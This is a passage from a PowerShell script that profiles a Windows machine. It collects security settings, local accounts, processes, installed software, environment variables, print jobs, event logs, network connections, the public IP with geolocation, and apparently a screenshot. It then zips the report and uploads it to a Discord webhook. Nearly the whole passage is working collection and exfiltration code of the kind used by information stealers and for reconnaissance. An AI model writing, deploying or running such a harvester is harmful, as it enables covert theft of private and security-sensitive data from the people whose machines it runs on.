        $bitlocker = Get-BitLockerVolume -ErrorAction Stop | Select-Object MountPoint, VolumeType, VolumeStatus, ProtectionStatus, EncryptionMethod
        Add-Table "BitLocker Volumes" $bitlocker
    } catch {
        Add-Line "BitLocker" "Unavailable or requires admin"
    }

    $tpm = $null
    try {
        $tpm = Get-Tpm | Select-Object TpmPresent, TpmReady, ManufacturerIdTxt, ManagedAuthLevel
        Add-Table "TPM" $tpm
    } catch {
        Add-Line "TPM" "Unavailable"
    }

    Set-JsonSection "Security" ([ordered]@{ Defender = $def; FirewallProfiles = $fw; BitLocker = $bitlocker; TPM = $tpm })
}

Invoke-SafeBlock {
    Add-Section "LOCAL ACCOUNTS"
    $users = Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, LastLogon
    $groups = Get-LocalGroup | Select-Object Name, Description
    Add-Table "Local Users" $users
    Add-Table "Local Groups" $groups
    Set-JsonSection "LocalAccounts" ([ordered]@{ Users = $users; Groups = $groups })
}

Invoke-SafeBlock {
    Add-Section "PROCESSES AND SERVICES"
    $procCpu = Get-Process | Sort-Object CPU -Descending | Select-Object -First 50 Name, Id, CPU, WorkingSet, StartTime
    $procMem = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 50 Name, Id, CPU, WorkingSet
    $services = Get-Service | Select-Object Name, DisplayName, StartType, Status
    Add-Table "Top Processes by CPU (50)" $procCpu
    Add-Table "Top Processes by RAM (50)" $procMem
    Add-Table "All Services" $services
    Set-JsonSection "ProcessesAndServices" ([ordered]@{ TopCPU = $procCpu; TopRAM = $procMem; Services = $services })
}

Invoke-SafeBlock {
    Add-Section "SOFTWARE"
    $appPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )

    $apps = foreach ($path in $appPaths) {
        Get-ItemProperty $path -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName } |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation
    }

    $apps = $apps | Sort-Object DisplayName -Unique
    $hotfixes = Get-HotFix | Select-Object HotFixID, InstalledOn, Description
    Add-Line "InstalledAppCount" ($apps.Count)
    Add-Table "Installed Apps (Top 600)" ($apps | Select-Object -First 600)
    Add-Table "Installed HotFixes" $hotfixes
    Set-JsonSection "Software" ([ordered]@{ InstalledAppCount = $apps.Count; Apps = $apps; HotFixes = $hotfixes })
}

Invoke-SafeBlock {
    Add-Section "STARTUP AND SCHEDULED"
    $startup = Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User
    $tasks = Get-ScheduledTask | Select-Object -First 500 TaskPath, TaskName, State, Author, Description
    Add-Table "Startup Commands" $startup
    Add-Table "Scheduled Tasks (Top 500)" $tasks
    Set-JsonSection "StartupAndScheduled" ([ordered]@{ Startup = $startup; ScheduledTasks = $tasks })
}

Invoke-SafeBlock {
    Add-Section "DRIVERS"
    $drivers = Get-CimInstance Win32_PnPSignedDriver |
        Select-Object -First 800 DeviceName, DriverProviderName, DriverVersion, DriverDate, InfName
    Add-Table "Signed Drivers (Top 800)" $drivers
    Set-JsonSection "Drivers" $drivers
}

Invoke-SafeBlock {
    Add-Section "HARDWARE EXTRAS"
    $usb = Get-PnpDevice -PresentOnly -Class USB -ErrorAction SilentlyContinue |
        Select-Object Status, Class, FriendlyName, InstanceId
    $monitors = Get-CimInstance Win32_DesktopMonitor | Select-Object Name, ScreenHeight, ScreenWidth, PNPDeviceID
    $printers = Get-Printer -ErrorAction SilentlyContinue | Select-Object Name, DriverName, PortName, Shared, Published
    $shares = Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name, Path, Description, CurrentUsers

    $printJobs = @()
    try {
        if ($printers) {
            $printJobs = @($printers | ForEach-Object {
                $pname = $_.Name
                Get-PrintJob -PrinterName $pname -ErrorAction SilentlyContinue |
                    Select-Object @{N='Printer';E={$pname}}, Id, DocumentName, UserName, JobStatus, TotalPages, Size, SubmittedTime
            } | Where-Object { $_ })
        }
    } catch {}

    Add-Table "USB Devices" $usb
    Add-Table "Monitors" $monitors
    Add-Table "Printers" $printers
    Add-Table "Print Queue" $printJobs
    Add-Table "SMB Shares" $shares
    Set-JsonSection "HardwareExtras" ([ordered]@{ USB = $usb; Monitors = $monitors; Printers = $printers; PrintJobs = $printJobs; Shares = $shares })
}

Invoke-SafeBlock {
    Add-Section "ENVIRONMENT"
    $envVars = Get-ChildItem Env: | Sort-Object Name | Select-Object Name, Value
    Add-Table "Environment Variables" $envVars
    Set-JsonSection "Environment" $envVars
}

Invoke-SafeBlock {
    Add-Section "EVENT SUMMARY"
    $recentSystemErrors = Get-WinEvent -FilterHashtable @{ LogName = "System"; Level = 1, 2; StartTime = (Get-Date).AddDays(-7) } -MaxEvents 120 |
        Select-Object TimeCreated, Id, LevelDisplayName, ProviderName, Message
    $recentAppErrors = Get-WinEvent -FilterHashtable @{ LogName = "Application"; Level = 1, 2; StartTime = (Get-Date).AddDays(-7) } -MaxEvents 120 |
        Select-Object TimeCreated, Id, LevelDisplayName, ProviderName, Message
    Add-Table "System Errors/Critical (7 days)" $recentSystemErrors
    Add-Table "Application Errors/Critical (7 days)" $recentAppErrors
    Set-JsonSection "EventSummary" ([ordered]@{ System = $recentSystemErrors; Application = $recentAppErrors })
}

Invoke-SafeBlock {
    Add-Section "COMMAND SNAPSHOTS"
    $systeminfo = (cmd /c systeminfo) | Out-String
    $ipconfig = (cmd /c ipconfig /all) | Out-String
    $netstat = (cmd /c netstat -ano) | Out-String
    $driverquery = (cmd /c driverquery /fo table) | Out-String
    $tasklist = (cmd /c tasklist) | Out-String

    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value "-- systeminfo --"
    Add-Content -Path $out -Value $systeminfo

    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value "-- ipconfig /all --"
    Add-Content -Path $out -Value $ipconfig

    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value "-- netstat -ano --"
    Add-Content -Path $out -Value $netstat

    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value "-- driverquery --"
    Add-Content -Path $out -Value $driverquery

    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value "-- tasklist --"
    Add-Content -Path $out -Value $tasklist

    Set-JsonSection "CommandSnapshots" ([ordered]@{
        systeminfo = $systeminfo
        ipconfig_all = $ipconfig
        netstat_ano = $netstat
        driverquery = $driverquery
        tasklist = $tasklist
    })
}

Invoke-SafeBlock {
    Add-Section "OPTIONAL INTERNET"
    $publicIp = "Unavailable"
    try {
        $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text" -TimeoutSec 10)
    } catch {}
    Add-Line "PublicIP" $publicIp
    Set-JsonSection "Internet" ([ordered]@{ PublicIP = $publicIp })
}

if ($publicIp -ne "Unavailable") {
    Add-Section "GEOLOCATION"
    $geoInfo = $null
    try {
        $geoInfo = Invoke-RestMethod -Uri "https://ipapi.co/$publicIp/json/" -TimeoutSec 10
    } catch {}
    if ($geoInfo) {
        Add-Line "Country" $geoInfo.country_name
        Add-Line "Region" $geoInfo.region
        Add-Line "City" $geoInfo.city
        Set-JsonSection "Geolocation" ([ordered]@{
            Country = $geoInfo.country_name
            Region  = $geoInfo.region
            City    = $geoInfo.city
        })
    }
}

if ($publicIp -ne "Unavailable") {
    Add-Section "REVERSE DNS"
    $reverseDns = "Unavailable"
    try {
        $reverseDns = [System.Net.Dns]::GetHostEntry($publicIp).HostName
    } catch {}
    Add-Line "ReverseDNS" $reverseDns
    Set-JsonSection "ReverseDNS" ([ordered]@{ HostName = $reverseDns })
}

$jsonData["OutputFiles"] = [ordered]@{
    TextReport = $out
    JsonReport = $jsonOut
    ZipReport = $zipOut
    DoneMarker = $done
}

Set-Content -Path $jsonOut -Value ($jsonData | ConvertTo-Json -Depth 8) -Encoding UTF8

Invoke-SafeBlock {
    Add-Section "DISCORD UPLOAD"
    $webhookUrl = Resolve-DiscordWebhook
    if ([string]::IsNullOrWhiteSpace($webhookUrl)) {
        Add-Line "UploadStatus" "Skipped (no webhook set)"
        Add-Line "HowToEnable" "Set DISCORD_WEBHOOK_URL env var or create discord_webhook.txt next to this script"
        Set-JsonSection "DiscordUpload" ([ordered]@{ Enabled = $false; Status = "Skipped"; Reason = "No webhook" })
    } else {
        $maxBytes = 24MB
        $uploadTarget = $null

        $zipSources = @($out, $jsonOut)
        if (Test-Path $screenshotOut) { $zipSources += $screenshotOut }
        Compress-Archive -Path $zipSources -DestinationPath $zipOut -Force

        if ((Get-Item $zipOut).Length -le $maxBytes) {
            $uploadTarget = $zipOut
            Add-Line "UploadTarget" "info_upload.zip"
        } elseif ((Get-Item $jsonOut).Length -le $maxBytes) {
            $uploadTarget = $jsonOut
            Add-Line "UploadTarget" "info.json"
            Add-Line "Note" "Zip was too large; uploaded JSON only"
        } else {
            throw "Reports are larger than Discord upload limits."
        }

        $payload = Build-DiscordPayload -FileName ([System.IO.Path]::GetFileName($uploadTarget))
        $filesToSend = [System.Collections.Generic.List[string]]::new()
        $filesToSend.Add($uploadTarget)
        if (Test-Path $screenshotOut) { $filesToSend.Add($screenshotOut) }
        Send-DiscordWebhookFiles -WebhookUrl $webhookUrl -Payload $payload -FilePaths $filesToSend.ToArray()
        Add-Line "UploadStatus" "Success"
        Add-Line "UploadedFile" ([System.IO.Path]::GetFileName($uploadTarget))
        Set-JsonSection "DiscordUpload" ([ordered]@{ Enabled = $true; Status = "Success"; UploadedFile = [System.IO.Path]::GetFileName($uploadTarget) })
    }
}

# Refresh JSON so Discord upload status is included.
Set-Content -Path $jsonOut -Value ($jsonData | ConvertTo-Json -Depth 8) -Encoding UTF8
Set-Content -Path $done -Value "done=1" -Encoding ascii
